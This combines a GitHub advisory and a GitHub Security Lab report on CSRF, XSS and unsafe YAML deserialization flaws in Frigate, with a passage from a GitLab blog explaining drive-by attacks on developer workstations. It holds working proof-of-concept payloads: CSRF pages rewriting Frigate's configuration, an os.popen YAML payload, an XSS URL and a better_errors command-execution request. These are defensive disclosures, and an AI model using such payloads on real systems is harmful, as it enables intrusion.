=== Content from github.com_9f39880a_20250114_202646.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-xq49-hv88-jr6h)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fblakeblackshear%2Ffrigate%2Fsecurity%2Fadvisories%2FGHSA-xq49-hv88-jr6h)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=blakeblackshear%2Ffrigate)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[blakeblackshear](/blakeblackshear)
/
**[frigate](/blakeblackshear/frigate)**
Public

* [Notifications](/login?return_to=%2Fblakeblackshear%2Ffrigate) You must be signed in to change notification settings
* [Fork
  1.9k](/login?return_to=%2Fblakeblackshear%2Ffrigate)
* [Star
   20.3k](/login?return_to=%2Fblakeblackshear%2Ffrigate)

* [Code](/blakeblackshear/frigate)
* [Issues
  116](/blakeblackshear/frigate/issues)
* [Pull requests
  47](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects
  0](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

Additional navigation options

* [Code](/blakeblackshear/frigate)
* [Issues](/blakeblackshear/frigate/issues)
* [Pull requests](/blakeblackshear/frigate/pulls)
* [Discussions](/blakeblackshear/frigate/discussions)
* [Actions](/blakeblackshear/frigate/actions)
* [Projects](/blakeblackshear/frigate/projects)
* [Security](/blakeblackshear/frigate/security)
* [Insights](/blakeblackshear/frigate/pulse)

# Cross-site request forgery in `config\_save` and `config\_set` request handlers (GHSL-2023-198)

Moderate

[blakeblackshear](/blakeblackshear)
published
GHSA-xq49-hv88-jr6h
Oct 28, 2023

## Package

No package listed

## Affected versions

<= v0.12.1, < v0.13.0 Beta 3

## Patched versions

v0.13.0 Beta 3

## Description

## Summary

The [`config/save`](https://github.com/blakeblackshear/frigate/blob/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py#L998) and [`config/set`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) endpoints of Frigate do not implement any CSRF protection. This makes it possible for a request sourced from another site to update the configuration of the Frigate server (e.g. via ["drive-by" attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)).

Exploiting this vulnerability requires the attacker to both know very specific information about a user's Frigate server and requires an authenticated user to be tricked into clicking a specially crafted link to their Frigate instance.

This vulnerability could exploited by an attacker under the following circumstances:

1. Frigate publicly exposed to the internet (even with authentication)
2. Attacker knows the address of a user's Frigate instance
3. Attacker crafts a specialized page which links to the user's Frigate instance
4. Attacker finds a way to get an authenticated user to visit their specialized page and click the button/link

## Details

When provided with a `POST` request containing the `save_option` parameter, the [`config_save` request handler](https://github.com/blakeblackshear/frigate/blob/367d7244d37f4e48ce1760b319c0fe141ab58711/frigate/http.py#L751) will attempt to write the user-supplied configuration in the request body to the configuration file on disk. Similarly, when provided with a `PUT` request the [`config_set` request handler](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) will attempt to update the existing configuration file with the user-supplied values specified as variables in the URL.

As these endpoints do not have any CSRF protection or authentication requirement this permits a request from any origin (e.g. a ["drive-by" attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)) to update the configuration of the Frigate server.

##### Proof of Concept

1. Start Frigate following the [Docker instructions](https://docs.frigate.video/frigate/installation#docker) using the [example `config.yml` file](https://github.com/blakeblackshear/frigate/blob/v0.12.1/config/config.yml.example).
2. Host an HTML file with the following contents anywhere accessible from your local machine:

```
<html>
<script>
function pwnd()
{
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "http://<FRIGATE_SERVER>:5000/api/config/save?save_option=saveonly");
        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};
let data = `mqtt:
  host: mqtt
cameras:
  pwnd:
    ffmpeg:
      inputs:
        - path: /media/frigate/car-stopping.mp4
          input_args: -re -stream_loop -1 -fflags +genpts
          roles:
            - detect
            - rtmp
    detect:
      height: 1080
      width: 1920
      fps: 5`;
        xhr.send(data);
        console.log("pwnd");
}
pwnd();
</script>
</html>
```

3. Access the new page (e.g. `http://<YOUR_WEB_SERVER_HOST>/poc.html`).
4. Note that the configuration of the Frigate service has been updated to now have a camera named `pwnd` instead of `test`.

This can also be performed against the `config/set` endpoint with the same setup outlined above, but the following `poc.html` which will update the `mqtt.host` value to `pwnd`:

```
<html>
<script>
        function pwn() {
        let xhr = new XMLHttpRequest();
        xhr.open("PUT", "http://<FRIGATE_SERVER>:5000/api/config/set?mqtt.host=pwnd");
        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};
        xhr.send();
        }
pwn();
</script>
</html>
```

This demonstrates that requests from any origin can result in arbitrary writes to Frigate's configuration.

#### Impact

This issue can lead to arbitrary configuration updates for the Frigate server, resulting in denial of service and possible data exfiltration.

### Severity

Moderate

### CVE ID

CVE-2023-45670

### Weaknesses

[CWE-352](/advisories?query=cwe%3A352)

### Credits

* [![@jorgectf](https://avatars.githubusercontent.com/u/46056498?s=40&v=4)](/jorgectf)
  [jorgectf](/jorgectf)
  Reporter
* [![@maclarel](https://avatars.githubusercontent.com/u/21298298?s=40&v=4)](/maclarel)
  [maclarel](/maclarel)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from securitylab.github.com_c078a96a_20250114_202647.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

December 12, 2023
# GHSL-2023-190: Several vulnerabilities in Frigate - CVE-2023-45672, CVE-2023-45671, CVE-2023-45670

[![Author avatar](https://avatars.githubusercontent.com/u/61799930)
Logan MacLaren](https://github.com/ghsecuritylab)

## Coordinated Disclosure Timeline

* 2023-10-04: Report sent to blakeb@blakeshome.com
* 2023-10-07: Maintainer acknowledges the report
* 2023-10-10: Created reports through Private Vulnerability Reporting: [GHSA-qp3h-4q62-p428](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-qp3h-4q62-p428), [GHSA-jjxc-m35j-p56f](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-jjxc-m35j-p56f), [GHSA-xq49-hv88-jr6h](https://github.com/blakeblackshear/frigate/security/advisories/GHSA-xq49-hv88-jr6h)
* 2023-10-28: Reports are published

## Summary

* ### Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

  + An unsafe deserialization vulnerability was identified in the endpoints used to save configurations for Frigate. This can lead to unauthenticated remote code execution. This can be performed through the UI at `/config` or through a direct call to `/api/config/save`.
* ### Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

  + There is a reflected XSS vulnerability in any API endpoints reliant on the `/<camera_name>` base path as values provided for the path are not sanitized.
* ### Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

  + The [`config/save`](https://github.com/blakeblackshear/frigate/blob/6aedc39a9a421cf48000a727f36b4c1495848a1d/frigate/http.py#L998) and [`config/set`](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) endpoints of Frigate do not implement any CSRF protection. This makes it possible for a request sourced from another site to update the configuration of the Frigate server (e.g. via “[“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)).
* ### Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

  + The `logs/<service>` endpoint permits a user to retrieve logs from specified services (nginx, go2rtc, frigate), however if the user specifies a service that is not in that list this endpoint *should* return an error stating that the service is unavailable. The returned data is the default content-type of `text/html` and is unsanitized. As such, this permits the injection of javascript payloads.

    - Please note that this is not currently exploitable due to a [separate bug](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814), however if/when that is resolved it will permit this XSS vulnerability to be exploited. The bug preventing this can be found in the `if` statement that [wraps this error message](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1814). This should presumable read `if not service_location` or `if service not in log_locations`.

## Project

Frigate

## Tested Version

* [v0.12.1](https://github.com/blakeblackshear/frigate/releases/tag/v0.12.1)
* [v0.13.0 Beta 1](https://github.com/blakeblackshear/frigate/releases/tag/v0.13.0-beta1)

## Details

### Issue 1: Unsafe deserialization in `load_config_with_no_duplicates` of `frigate/util/builtin.py` (`GHSL-2023-190`)

Input is initially accepted through `http.py` at [frigate/http.py:998](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L998-L998):

```
@bp.route("/config/save", methods=["POST"])
def config_save():
    save_option = request.args.get("save_option")

    new_config = request.get_data().decode()

```

The user-provided input is then parsed and loaded by `load_config_with_no_duplicates` at [frigate/config.py:1244](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/config.py#L1244-L1244):

```
@classmethod
def parse_raw(cls, raw_config):
    config = load_config_with_no_duplicates(raw_config)
    return cls.parse_obj(config)

```

However, `load_config_with_no_duplicates` uses `yaml.loader.Loader` which can instantiate custom constructors. A provided payload will be executed directly at [frigate/util/builtin.py:110](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/util/builtin.py#L110-L110):

```
PreserveDuplicatesLoader.add_constructor(
    yaml.resolver.BaseResolver.DEFAULT_MAPPING_TAG, map_constructor
)
return yaml.load(raw_config, PreserveDuplicatesLoader)

```

This vulnerability was found using CodeQL’s [Deserialization of user-controlled data query](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/) for Python.

#### Impact

This issue may lead to pre-authenticated Remote Code Execution.

#### Proof of Concept:

1. Start Frigate in [Docker](https://docs.frigate.video/frigate/installation/#docker) for ease of setup.
2. Navigate to `localhost:5000/config`.
3. Enter the following content into the config, and save the configuration:

```
!!python/object/apply:os.popen
- touch /tmp/pwned

```

1. Note that `/tmp/pwned` is created in the container. This access can also be extended to write to mounted filesystems if not mounted as read-only.

#### Resources

* [CodeQL for Python: Unsafe Deserialization](https://codeql.github.com/codeql-query-help/python/py-unsafe-deserialization/)
* [Python Yaml Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/python-yaml-deserialization#rce)

### Issue 2: Reflected XSS through `/<camera_name>` API endpoints (`GHSL-2023-195`)

The [`recording_clip` request handler](https://github.com/blakeblackshear/frigate/blob/9185753322cc594b99509e9234c60647e70fae6f/frigate/http.py#L1426C14-L1426C14) returns an unescaped/unsanitized string based on the `camera_name` requested in the route that calls it. As a result of this, reflected XSS is possible.

By calling a camera that does not exist, we can force a failure response that will return the requested value. Note that this is response will use [Flask’s default `content-type` of `text/html`](https://flask.palletsprojects.com/en/2.3.x/quickstart/#about-responses):

```
if p.returncode != 0:
  logger.error(p.stderr)
  return f"Could not create clip from recordings for {camera_name}.", 500

```

As an example, we can trigger an XSS payload using the [official demo instance](https://demo.frigate.video) with the following `GET` request executed in a browser:

```
GET https://demo.frigate.video/api/%3Cimg%20src=%22%22%20onerror=alert(document.domain)%3E

```

This vulnerability was found using CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/) for Python.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

### Issue 3: Cross-site request forgery vulnerability in `config_save` and `config_set` request handlers (`GHSL-2023-198`)

When provided with a `POST` request containing the `save_option` parameter, the [`config_save` request handler](https://github.com/blakeblackshear/frigate/blob/367d7244d37f4e48ce1760b319c0fe141ab58711/frigate/http.py#L751) will attempt to write the user-supplied configuration in the request body to the configuration file on disk. Similarly, when provided with a `PUT` request the [`config_set` request handler](https://github.com/blakeblackshear/frigate/blob/5658e5a4cc7376504af9de5e1eff178939a13e7f/frigate/http.py#L1060) will attempt to update the existing configuration file with the user-supplied values specified as variables in the URL.

As these endpoints do not have any CSRF protection or authentication requirement this permits a request from any origin (e.g. a [“drive-by” attack](https://about.gitlab.com/blog/2021/09/07/why-are-developers-vulnerable-to-driveby-attacks/)) to update the configuration of the Frigate server.

##### Proof of Concept

1. Start Frigate following the [Docker instructions](https://docs.frigate.video/frigate/installation#docker) using the [example `config.yml` file](https://github.com/blakeblackshear/frigate/blob/v0.12.1/config/config.yml.example).
2. Host an HTML file with the following contents anywhere accessible from your local machine:

```
<html>
<script>
function pwnd()
{
        let xhr = new XMLHttpRequest();
        xhr.open("POST", "http://<FRIGATE_SERVER>:5000/api/config/save?save_option=saveonly");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};
let data = `mqtt:
  host: mqtt

cameras:
  pwnd:
    ffmpeg:
      inputs:
        - path: /media/frigate/car-stopping.mp4
          input_args: -re -stream_loop -1 -fflags +genpts
          roles:
            - detect
            - rtmp
    detect:
      height: 1080
      width: 1920
      fps: 5`;

        xhr.send(data);
        console.log("pwnd");
}

pwnd();
</script>
</html>

```

1. Access the new page (e.g. `http://<YOUR_WEB_SERVER_HOST>/poc.html`).
2. Note that the configuration of the Frigate service has been updated to now have a camera named `pwnd` instead of `test`.

This can also be performed against the `config/set` endpoint with the same setup outlined above, but the following `poc.html` which will update the `mqtt.host` value to `pwnd`:

```
<html>
<script>
        function pwn() {
        let xhr = new XMLHttpRequest();
        xhr.open("PUT", "http://<FRIGATE_SERVER>:5000/api/config/set?mqtt.host=pwnd");

        xhr.onreadystatechange = function () {
                  if (xhr.readyState === 4) {
                              console.log(xhr.status);
                              console.log(xhr.responseText);
                            }};

        xhr.send();
        }
pwn();
</script>
</html>

```

This demonstrates that requests from any origin can result in arbitrary writes to Frigate’s configuration.

#### Impact

This issue can lead to arbitrary configuration updates for the Frigate server, resulting in denial of service and possible data exfiltration.

#### Resources

* [OWASP Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern)

### Issue 4: Cross-site scripting in `/logs/<service>` endpoint (`GHSL-2023-209`)

The following error message is returned with a content type of `text/html` and the values are fully user controlled and unsanitized.

```
return f"{service} is not a valid service", 404

```

This permits an attacker to craft a URL to a service that is not in [the valid `log_locations`](https://github.com/blakeblackshear/frigate/blob/ead03c381b70fab1db7f6dd3952d6e8ea1217417/frigate/http.py#L1807) and that instead contains a javascript payload for XSS purposes.

This was identified with CodeQL’s [Reflected server-side cross-site scripting](https://codeql.github.com/codeql-query-help/python/py-reflective-xss/#reflected-server-side-cross-site-scripting) query.

#### Impact

As the reflected values included in the URL are not sanitized or escaped, this permits execution arbitrary Javascript payloads.

#### Resources

* Python Library Reference: [html.escape()](https://docs.python.org/3/library/html.html#html.escape).
* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).

## CVE

* CVE-2023-45672
* CVE-2023-45671
* CVE-2023-45670

## Credit

This issue was discovered and reported by GHSL team members [@maclarel (Logan MacLaren)](https://github.com/maclarel) and [@jorgectf (Jorge Rosillo)](https://github.com/jorgectf).

## Contact

You can contact the GHSL team at `securitylab@github.com`, please include a reference to `GHSL-2023-190`, `GHSL-2023-195`, `GHSL-2023-198`, or `GHSL-2023-209` in any communication regarding this issue.

## Product

* [Features](https://github.com/features)
* [Security](https://github.com/security)
* [Team](https://github.com/team)
* [Enterprise](https://github.com/enterprise)
* [Customer stories](https://github.com/customer-stories?type=enterprise)
* [The ReadME Project](https://github.com/readme)
* [Pricing](https://github.com/pricing)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare/)

## Platform

* [Developer API](https://developer.github.com)
* [Partners](http://partner.github.com/)
* [Atom](https://atom.io)
* [Electron](http://electron.atom.io/)
* [GitHub Desktop](https://desktop.github.com/)

## Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com/)
* [GitHub Skills](https://skills.github.com/)
* [Status](https://githubstatus.com/)
* [Contact GitHub](https://support.github.com)

## Company

* [About](https://github.com/about)
* [Blog](https://github.blog)
* [Careers](https://github.com/about/careers)
* [Press](https://github.com/about/press)
* [Inclusion](https://github.com/about/careers)
* [Social Impact](https://github.com/about/press)
* [Shop](https://shop.github.com)

* GitHub Inc. ©
  2024
* [Terms](https://docs.github.com/en/github/site-policy/github-terms-of-service)
* [Privacy](https://docs.github.com/en/github/site-policy/github-privacy-statement)
* Sitemap
* [What is Git?](https://github.com/git-guides)
* Manage Cookies
* Do not share my personal information



=== Content from about.gitlab.com_62a11842_20250114_202631.html ===

  [Blog](/blog/)  [Security](/blog/categories/security/)  Why are developers so vulnerable to drive-by attacks?
Published on: September 7, 2021

14 min read
# Why are developers so vulnerable to drive-by attacks?

The complexity of developer working environments make them more likely to be vulnerable to a drive-by attack. We talk about why and walk you through a real-life example from a recent disclosure here at GitLab, and provide tips to reduce the risk and impact of drive-by attacks.

![pexels-pixabay-434450.jpg](//images.ctfassets.net/r9o86ar0p03f/pexels-pixabay-434450.jpg/078662d618695b0ce06b81d504ffb03d/pexels-pixabay-434450.jpg?fm=webp&w=1640&h=1000) ![cmoberly-headshot](//images.ctfassets.net/r9o86ar0p03f/1ffz25NUleyRRPXIx6Gv8L/139e626bffb20bbaedbf366b3e44adc6/cmoberly-headshot?fm=webp&w=160&h=160) [Chris Moberly](/blog/authors/cmoberly/) [security](/blog/tags/security/)

As someone who spends a lot of time working with computers, I know how easy it is to grow over-confident with regards to security. My systems are patched, my firewall rules are tight, and Iâm vigilant when it comes to just about anything that looks out of the ordinary.

No oneâs hacking their way into *my* workstation, thatâs for sure.

But my experience working as a hacker myself has shown me that the opposite is often true. Those of us who are *more* technical are often *much more* vulnerable to an attack due to the complexity of our working environments.

In this blog, weâre going to dive into the anatomy of something called a âdrive-by attack,â where malicious code hidden within a website uses your own browser to attack your computer.

As an example, Iâll show you how our own [Red Team](/handbook/security/threat-management/red-team/) was able to chain multiple vulnerabilities in the [GitLab Development Kit](https://gitlab.com/gitlab-org/gitlab-development-kit/-/blob/main/README.md) (GDK) to achieve remote code execution (RCE) on developer laptops. And lastly, weâll discuss steps you can take to reduce the risk of this happening to you.

## How drive-by attacks work

Drive-by attacks come in many forms. Each type of attack starts the same way - you visit a website that contains some malicious code (typically JavaScript). That code will then target a specific type of vulnerability, either in your browser itself or in some other network service that your browser can access. In this blog, we will focus on the latter.

What I find particularly fascinating about these attacks is that they completely bypass traditional protections like network firewalls and antivirus software. I think many are under the impression that a network service running on their localhost address cannot be targeted remotely. This is simply not true; in fact, this same technique can be used to target any service on your local network, even those without any outbound internet access at all!

Letâs say you are running a test webserver on your laptop on port 8000. You can simulate this running a simple [netcat](https://en.wikipedia.org/wiki/Netcat) command:

```
nc -lkp 8000

```

Now letâs say you are browsing the internet while that test server is running locally. You visit a site that has been compromised with malicious JavaScript. Weâve set up a site at <https://gitlab-com.gitlab.io/gl-security/security-operations/gl-redteam/simple-request> that mimics a basic attack. The site contains the following JavaScript:

```
<script>
	fetch("http://localhost:8000", {
    	method: 'post',
    	body: 'you\'re under attack!',
	})
</script>

```

When you open the site in your browser, you should see that a POST request has been executed against your simulated server, like the screenshot below.

![file name](https://about.gitlab.com/images/blogimages/drive-by/firefox.png)
Help, Iâm under attack!

When JavaScript attempts to interact with another website, the first thing your browser checks is whether or not the protocol, port, and domain all match between that other site and where the script was originally loaded from. This is called the [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy): it's your browserâs first line of defense when it comes to these types of attacks.

In our example above, none of these items matched. That makes this a cross-origin request. Luckily, modern browsers have some mechanisms to restrict exactly what these types of requests can do.

One of these is called a â[CORS preflight request](https://developer.mozilla.org/en-US/docs/Glossary/Preflight_request).â When some JavaScript asks your browser to perform complex actions on a cross-origin request, your browser will first send an HTTP OPTIONS request to the target. The target will respond with various HTTP headers that tell the browser what is allowed. The most common of these is the â[Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin)â header.

If this header is set to `*` or to the website containing the malicious code, then your browser will let the code perform complex HTTP requests and access the responses. This would include shipping results off to a remote server, or performing complex multi-step actions like logging in to a service or gaining access to the session token; basically the code will be interacting with it as if it were a human user.

Another header you may encounter is [Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#requests_with_credentials). When set to `true`, the origin specified in `Access-Control-Allow-Origin` can perform credentialed requests utilizing the browserâs active sessions. When origin validation is not done properly and the requesting origin is blindly reflected in `Access-Control-Allow-Origin`, drive-by attacks against authenticated services become much more likely to succeed as they do not need to first guess the password and mimic a logon.

From my experience, the first example (`Access-Control-Allow-Origin: *`) is enabled quite often in development software and open-source projects. Even production-ready applications may intentionally set this header to `*` when started with certain flags that tell them they are running in development mode.

What makes matters worse is that software run in development mode tends to have other relaxed security measures: verbose error logging, default passwords or even debuggers that allow web requests to execute commands on the host operating system. This makes it very easy for malicious JavaScript to turn basic cross-origin requests into full-on drive-by exploits that completely compromise your machine.

**To be very clear, if you are running a web server on your workstation with this header set, you are granting permission to any website you visit to fully interact with your application. If that application has the ability to run commands on your laptop, you could be granting any website you visit permission to run commands on your laptop.**

â*Well, thatâs fine*,â you might think. â*Iâll just remove that header and be good to go*â.

Unfortunately, itâs not that simple. The preflight check has a pretty big loophole via something called a â[simple request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).â Remote JavaScript is allowed to completely bypass the check if it follows some simple rules, like:

* Must be only GET, HEAD, or POST
* Must be one of three content types (`application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`)
* Must use only a specific set of HTTP headers
* Cannot read the response from the target service

This is why we had no issues running the âyouâre under attack!â example above. It followed the rules and was a simple request.

So, to reiterate:

* Any website on the internet can use your browser to attack any service you have access to as long as the attack follows certain rules.
* Services that implement strong protections against Cross-Site Request Forgery (CSRF) can be more resilient to these attacks.
* Services that specifically reduce these protections (like with the `Access-Control-Allow-Origin` header) are vulnerable to any attack, whether they follow the rules or not.

How confident are you that every service you run and test locally has implemented strong CSRF protections and has not removed them while in development mode? And even if they have, how confident are you that they cannot still be exploited via the simple requests described above?

## Example: Drive-by RCE in the GitLab GDK

The GitLab GDK is a tool that helps GitLab contributors install a fully-functioning GitLab instance for development purposes.

In September of 2020, our Red Team was researching how our developers could be targeted by sophisticated attackers. We were able to chain multiple vulnerabilities in the GDK to conduct the exact type of attack described in this blog, demonstrating how developer workstations could be remotely compromised.

**These vulnerabilities were quickly patched, the community was asked to upgrade, and this specific risk no longer exists. Read on below about the specific issues and their fixes.**

The attack targeted two components bundled with the GDK:

* [Better Errors](https://github.com/BetterErrors/better_errors): a Rails error debugging tool
* [webpack-dev-server](https://github.com/webpack/webpack-dev-server): a development web server that provides static file access

When visited, the first thing the malicious website would do was to load the better\_errors console in an invisible iframe. The result of this was a simple `GET` request from the browser to `http://localhost:3000/__better_errors`.

When this URL was loaded, the better\_errors application would generate a unique error code (this is important later on) and then send an HTTP redirect code back to the browser inside the iframe. The URL that it redirected to would include the unique error code, like this:

```
http://localhost:3000/__better_errors/[ERROR CODE]/eval

```

Because better\_errors did not have the dangerous `Access-Control-Allow-Origin: *` header set, the malicious site could not actually view that response. However, the GDK keeps a lot of log files, including a record of every URL that has been accessed. This meant that the unique error code generated by better\_errors was now stored in a log file on the workstationâs filesystem.

The next step targeted the webpack-dev-server. This ran on localhost on port 3808 and was configured with the overly-permissive CORS header `Access-Control-Allow-Origin: *`. As discussed earlier in the blog, this header tells your browser that any website can interact freely with this service.

webpack-dev-server was configured to serve the contents of the log directory, so our malicious JavaScript could literally download and parse the current log file to extract the unique error code generated above.

Using this error code, the script would then create a specially-crafted HTTP POST request to instruct better\_errors to evaluate arbitrary Ruby code. And, of course, with Ruby we can encapsulate operating system commands in backticks to execute any command we wanted to on the host. That request looked like this:

```
POST http://localhost:3000/__better_errors/[ERROR CODE]/eval
Content-Type: text/plain
Accept: text/html

{"index":"0","source":"`touch /tmp/itworked`"}

```

It is worth noting that better\_errors actually **did not** have an overly-permissive CORS header. So, technically, we should not have been able to send the above command. Because the content being sent was actually JSON, it would not have qualified as a âsimple requestâ and would have had to pass a CORS preflight check, which would have failed.

However, the `Content-type` header was not being validated properly. We were able to bypass the preflight check by incorrectly setting the content type to `text/plain` while still providing a JSON payload in the request body.

When the malicious website instructed the browser to send that final request, the command would be executed and the host would be compromised.

![file name](https://about.gitlab.com/images/blogimages/drive-by/driveby.png)
The original PoC in action.

To summarize the issues that made this possible:

* Better Errors:
  + Improper validation of content type header
  + Lack of robust cross-site request forgery protection (CSRF tokens)
* webpack-dev-server:
  + Was configured to serve the entire GitLab directory (via `contentBase: true`)
  + Overly-permissive CORS header (`Access-Control-Allow-Origin: *`)

